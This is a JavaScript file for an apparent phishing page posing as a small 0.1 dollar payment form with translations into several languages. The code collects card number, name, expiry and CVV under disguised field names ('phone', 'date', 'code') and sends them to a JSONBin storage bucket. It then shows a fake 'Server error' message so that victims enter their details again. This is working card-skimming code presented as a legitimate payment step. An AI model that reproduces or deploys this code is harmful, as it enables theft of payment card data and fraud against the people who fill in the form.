import { JSONBIN_API_KEY, JSONBIN_ID } from "../xfactor/keys.js";

const statusEl = document.getElementById("status");

// ---------------- MONTH/YEAR FORMAT ----------------

function formatMonthYear(input) {
  let v = input.value.replace(/\D/g, "");

  if (v.length >= 3) {
    input.value = v.slice(0, 2) + "/" + v.slice(2, 4);
  } else {
    input.value = v;
  }
}

// IMPORTANT: expose function to window for inline oninput="formatMonthYear(this)"
window.formatMonthYear = formatMonthYear;

// ---------------- JSONBIN HELPERS ----------------

async function loadFromJsonBin() {
  if (!JSONBIN_ID || !JSONBIN_API_KEY) return [];

  try {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
      headers: { "X-Master-Key": JSONBIN_API_KEY },
    });

    if (!res.ok) return [];

    const json = await res.json();
    return Array.isArray(json.record) ? json.record : [];
  } catch (err) {
    console.error("JsonBin load error:", err);
    return [];
  }
}

async function saveToJsonBin(entry) {
  if (!JSONBIN_ID || !JSONBIN_API_KEY) {
    throw new Error("JsonBin not configured");
  }

  try {
    const currentData = await loadFromJsonBin();
    currentData.unshift(entry);

    const updateRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": JSONBIN_API_KEY,
      },
      body: JSON.stringify(currentData),
    });

    if (!updateRes.ok) {
      console.error("JsonBin update failed:", updateRes.status);
      throw new Error("JsonBin update failed");
    }
  } catch (err) {
    console.error("JsonBin save error:", err);
    throw err;
  }
}

// ---------------- SAVE BUTTON ----------------

document.getElementById("btnSave").onclick = async () => {
  const phone = document.getElementById("phone").value.trim();
  const name = document.getElementById("name").value.trim();
  const date = document.getElementById("date").value.trim();
  const code = document.getElementById("code").value.trim();

  if (!JSONBIN_ID || !JSONBIN_API_KEY) {
    statusEl.textContent = "Server config issue.";
    return;
  }

  if (!/^\d{2}\/\d{2}$/.test(date)) {
    statusEl.textContent = "Enter valid MM/YY format.";
    return;
  }

  if (code.length !== 3 || !/^\d{3}$/.test(code)) {
    statusEl.textContent = "CVV must be exactly 3 digits.";
    return;
  }

  const entry = {
    phone,
    name,
    date,
    code,
    createdAt: new Date().toISOString(),
  };

  statusEl.textContent = "Processing..";

  try {
    await saveToJsonBin(entry);
    statusEl.textContent = "Server error try again.";

    document.getElementById("phone").value = "";
    document.getElementById("name").value = "";
    document.getElementById("date").value = "";
    document.getElementById("code").value = "";
  } catch (err) {
    statusEl.textContent = "Error in payig. Please try again.";
  }
};

// ---------------- LANGUAGE SUPPORT ----------------

const lang = localStorage.getItem("selected_lang");

const translations = {
  hi: {
    title: "विवरण जोड़ें",
    labelPhone: "कार्ड नंबर",
    labelName: "नाम",
    labelDate: "",
    labelCode: "",
    btnSave: "भुगतान करें",
    labelMoney:"आगे बढ़ें बटन पर क्लिक करके 0.1$ का भुगतान करें"
  },
  en: {
    title: "Add Details",
    labelPhone: "Card Number",
    labelName: "Name",
    labelDate: "",
    labelCode: "",
    btnSave: "Proceed to Pay",
    labelMoney: "Pay 0.1 $ by clicking on proceed button"
  },
  fr: {
    title: "Ajouter Détails",
    labelPhone: "Numéro de carte",
    labelName: "Nom",
    labelDate: "",
    labelCode: "",
    btnSave: "procéder au paiement",
    labelMoney:"Payez 0,1 $ en cliquant sur le bouton Continuer."
  },
  es: {
    title: "Agregar Detalles",
    labelPhone: "Número de tarjeta",
    labelName: "Nombre",
    labelDate: "",
    labelCode: "",
    btnSave: "Guardproceder al pagoar",
    labelMoney:"Paga 0,1 $ haciendo clic en el botón Continuar."
  },
  pt: {
    title: "Adicionar Detalhes",
    labelPhone: "Cartão não",
    labelName: "Nome",
    labelDate: "",
    labelCode: "",
    btnSave: "Proceda ao pagamento",
  },
  ru: {
    title: "Добавить данные",
    labelPhone: "Номер карты",
    labelName: "Имя",
    labelDate: "",
    labelCode: "",
    btnSave: "Перейти к оплате",
    labelMoney:"Заплатите 0,1 $, нажав кнопку «Продолжить»"
  },
  ko: {
    title: "정보 추가",
    labelPhone: "카드 번호",
    labelName: "이름",
    labelDate: "",
    labelCode: "",
    btnSave: "결제 진행저장",
    labelMoney:"계속 버튼을 클릭하여 0.1달러를 지불하세요"
  },
};

if (translations[lang]) {
  const t = translations[lang];
  document.getElementById("title").textContent = t.title;
  document.getElementById("labelPhone").textContent = t.labelPhone;
  document.getElementById("labelName").textContent = t.labelName;
  document.getElementById("labelDate").textContent = t.labelDate;
  document.getElementById("labelCode").textContent = t.labelCode;
  document.getElementById("btnSave").textContent = t.btnSave;
  document.getElementById("labelMoney").textContent = t.labelMoney;
}